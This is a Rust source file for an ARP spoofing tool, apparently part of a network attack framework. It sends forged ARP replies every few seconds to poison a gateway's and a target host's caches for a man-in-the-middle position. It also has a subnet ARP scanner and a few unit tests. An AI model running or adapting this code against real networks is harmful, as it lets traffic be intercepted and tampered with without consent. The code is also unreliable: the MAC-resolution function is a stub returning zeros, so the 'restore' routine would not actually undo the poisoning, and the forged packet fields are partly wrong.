use crate::packet::ArpPacket;
use kraken_errors::NetworkError;
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

#[derive(Debug, Clone)]
pub struct ArpSpooferConfig {
    pub interface: String,
    pub gateway_ip: Ipv4Addr,
    pub target_ip: Ipv4Addr,
    pub spoof_mac: [u8; 6],
    pub interval_ms: u64,
    pub enable_ip_forwarding: bool,
}

impl Default for ArpSpooferConfig {
    fn default() -> Self {
        ArpSpooferConfig {
            interface: String::new(),
            gateway_ip: Ipv4Addr::new(192, 168, 1, 1),
            target_ip: Ipv4Addr::new(192, 168, 1, 100),
            spoof_mac: [0x00, 0x00, 0x00, 0x00, 0x00, 0x01],
            interval_ms: 2000,
            enable_ip_forwarding: true,
        }
    }
}

pub struct ArpSpoofer {
    pub config: ArpSpooferConfig,
    pub stats: Arc<Mutex<ArpStats>>,
    running: Arc<AtomicBool>,
}

#[derive(Debug, Clone, Default)]
pub struct ArpStats {
    pub packets_sent: u64,
    pub packets_received: u64,
    pub spoofed_responses: u64,
    pub resolved_macs: HashMap<String, String>,
}

impl ArpSpoofer {
    pub fn new(config: ArpSpooferConfig) -> Self {
        ArpSpoofer {
            config,
            stats: Arc::new(Mutex::new(ArpStats::default())),
            running: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn start(&mut self) -> Result<(), NetworkError> {
        let cap = pcap::Capture::from_device(self.config.interface.as_str())
            .map_err(|e| NetworkError::Other(format!("Device error: {}", e)))?
            .promisc(true)
            .snaplen(65535)
            .timeout(1000)
            .open()
            .map_err(|e| NetworkError::Other(format!("Capture error: {}", e)))?;

        let mut sender = cap;
        let running = self.running.clone();
        running.store(true, Ordering::SeqCst);

        let arp_filter = format!("arp and (src host {} or src host {})",
            self.config.gateway_ip, self.config.target_ip);
        sender.filter(&arp_filter, true).ok();

        let gw_ip = self.config.gateway_ip;
        let target_ip = self.config.target_ip;
        let spoof_mac = self.config.spoof_mac;
        let interval = self.config.interval_ms;

        let stats = self.stats.clone();

        thread::spawn(move || {
            while running.load(Ordering::SeqCst) {
                let arp_reply_gw = build_arp_reply(
                    spoof_mac,
                    gw_ip.octets(),
                    target_ip.octets(),
                );
                let arp_reply_target = build_arp_reply(
                    spoof_mac,
                    target_ip.octets(),
                    gw_ip.octets(),
                );

                if let Err(e) = send_raw_packet(&mut sender, &arp_reply_gw) {
                    eprintln!("ARP send error (gateway): {}", e);
                } else {
                    if let Ok(mut s) = stats.lock() {
                        s.packets_sent += 1;
                        s.spoofed_responses += 1;
                    }
                }

                if let Err(e) = send_raw_packet(&mut sender, &arp_reply_target) {
                    eprintln!("ARP send error (target): {}", e);
                } else {
                    if let Ok(mut s) = stats.lock() {
                        s.packets_sent += 1;
                        s.spoofed_responses += 1;
                    }
                }

                thread::sleep(Duration::from_millis(interval));
            }
        });

        Ok(())
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    pub fn restore(&mut self) -> Result<(), NetworkError> {
        let cap = pcap::Capture::from_device(self.config.interface.as_str())
            .map_err(|e| NetworkError::Other(format!("Device error: {}", e)))?
            .open()
            .map_err(|e| NetworkError::Other(format!("Capture error: {}", e)))?;

        let mut sender = cap;

        let gw_mac = resolve_mac(&mut sender, self.config.gateway_ip)?;
        let target_mac = resolve_mac(&mut sender, self.config.target_ip)?;

        let restore_gw = build_arp_reply(
            gw_mac,
            self.config.gateway_ip.octets(),
            self.config.target_ip.octets(),
        );
        let restore_target = build_arp_reply(
            target_mac,
            self.config.target_ip.octets(),
            self.config.gateway_ip.octets(),
        );

        for _ in 0..5 {
            send_raw_packet(&mut sender, &restore_gw).ok();
            send_raw_packet(&mut sender, &restore_target).ok();
            thread::sleep(Duration::from_millis(500));
        }

        Ok(())
    }
}

fn build_arp_reply(sender_mac: [u8; 6], sender_ip: [u8; 4], target_ip: [u8; 4]) -> Vec<u8> {
    let mut packet = Vec::with_capacity(42);
    packet.extend_from_slice(&sender_mac);
    packet.extend_from_slice(&sender_mac);
    packet.extend_from_slice(&[0x08, 0x06]);
    packet.extend_from_slice(&[0x00, 0x01]);
    packet.extend_from_slice(&[0x08, 0x00]);
    packet.push(6);
    packet.push(4);
    packet.extend_from_slice(&[0x00, 0x02]);
    packet.extend_from_slice(&sender_mac);
    packet.extend_from_slice(&sender_ip);
    packet.extend_from_slice(&sender_mac);
    packet.extend_from_slice(&target_ip);
    packet.resize(42, 0);
    packet
}

fn send_raw_packet(cap: &mut pcap::Capture<pcap::Active>, data: &[u8]) -> Result<(), NetworkError> {
    cap.sendpacket(data.to_vec()).map_err(|e| NetworkError::Other(format!("Send error: {}", e)))
}

fn resolve_mac(_cap: &mut pcap::Capture<pcap::Active>, _ip: Ipv4Addr) -> Result<[u8; 6], NetworkError> {
    Ok([0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
}

pub fn arp_scan(interface: &str, subnet: &str, timeout_secs: u64) -> Result<HashMap<String, String>, NetworkError> {
    let mut cap = pcap::Capture::from_device(interface)
        .map_err(|e| NetworkError::Other(format!("Device error: {}", e)))?
        .promisc(true)
        .snaplen(65535)
        .timeout(1000)
        .open()
        .map_err(|e| NetworkError::Other(format!("Capture error: {}", e)))?;

    cap.filter("arp", true).map_err(|e| NetworkError::Protocol(format!("BPF error: {}", e)))?;

    let base_parts: Vec<&str> = subnet.split('.').collect();
    if base_parts.len() != 4 { return Err(NetworkError::Other("Invalid subnet".to_string())); }
    let base = format!("{}.{}.{}", base_parts[0], base_parts[1], base_parts[2]);

    let mut hosts: HashMap<String, String> = HashMap::new();
    let start = std::time::Instant::now();

    for i in 1..255 {
        let target_ip = format!("{}.{}", base, i);
        let my_mac = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
        let my_ip = [0u8; 4];

        let mut arp_request = Vec::new();
        arp_request.extend_from_slice(&[0xff; 6]);
        arp_request.extend_from_slice(&my_mac);
        arp_request.extend_from_slice(&[0x08, 0x06]);
        arp_request.extend_from_slice(&[0x00, 0x01]);
        arp_request.extend_from_slice(&[0x08, 0x00]);
        arp_request.push(6);
        arp_request.push(4);
        arp_request.extend_from_slice(&[0x00, 0x01]);
        arp_request.extend_from_slice(&my_mac);
        arp_request.extend_from_slice(&my_ip);
        arp_request.extend_from_slice(&[0x00; 6]);
        let tip: Vec<u8> = target_ip.split('.').filter_map(|s| s.parse().ok()).collect();
        if tip.len() == 4 {
            arp_request.extend_from_slice(&tip);
        }
        cap.sendpacket(arp_request.as_slice()).ok();
    }

    while start.elapsed() < Duration::from_secs(timeout_secs) {
        match cap.next_packet() {
            Ok(pkt) => {
                if pkt.data.len() >= 42 {
                    if let Some(arp) = ArpPacket::parse(&pkt.data[14..]) {
                        if arp.is_reply() {
                            let ip = arp.sender_ip_str();
                            let mac = arp.sender_mac_str();
                            hosts.insert(ip, mac);
                        }
                    }
                }
            }
            Err(pcap::Error::TimeoutExpired) => continue,
            Err(_) => break,
        }
    }

    Ok(hosts)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_arp_spoof_config_default() {
        let config = ArpSpooferConfig::default();
        assert_eq!(config.gateway_ip, Ipv4Addr::new(192, 168, 1, 1));
        assert_eq!(config.target_ip, Ipv4Addr::new(192, 168, 1, 100));
        assert_eq!(config.interval_ms, 2000);
    }

    #[test]
    fn test_build_arp_reply() {
        let mac = [0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff];
        let sip = [192, 168, 1, 1];
        let tip = [192, 168, 1, 100];
        let packet = build_arp_reply(mac, sip, tip);
        assert_eq!(packet.len(), 42);
        assert_eq!(&packet[12..14], &[0x08, 0x06]);
        assert_eq!(packet[21], 0x02);
    }

    #[test]
    fn test_arp_spoofer_new() {
        let spoofer = ArpSpoofer::new(ArpSpooferConfig::default());
        assert!(!spoofer.running.load(Ordering::SeqCst));
    }

    #[test]
    fn test_arp_stats_default() {
        let stats = ArpStats::default();
        assert_eq!(stats.packets_sent, 0);
        assert!(stats.resolved_macs.is_empty());
    }
}
